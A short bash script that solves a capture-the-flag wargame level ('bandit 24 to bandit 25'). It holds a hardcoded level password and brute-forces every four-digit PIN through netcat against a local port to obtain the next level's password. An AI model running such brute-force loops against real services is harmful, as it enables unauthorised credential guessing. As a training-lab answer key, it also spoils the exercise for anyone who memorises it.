#this pc can solve the "bandit 24 to bandit 25" challenge.
#it's a simple brute force to localhost port 30002 to get the bandit25 user password

#!/bin/bash

bandit24pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for pin in {0000..9999};do
	echo "$bandit24pass $pin"
done | nc localhost 30002
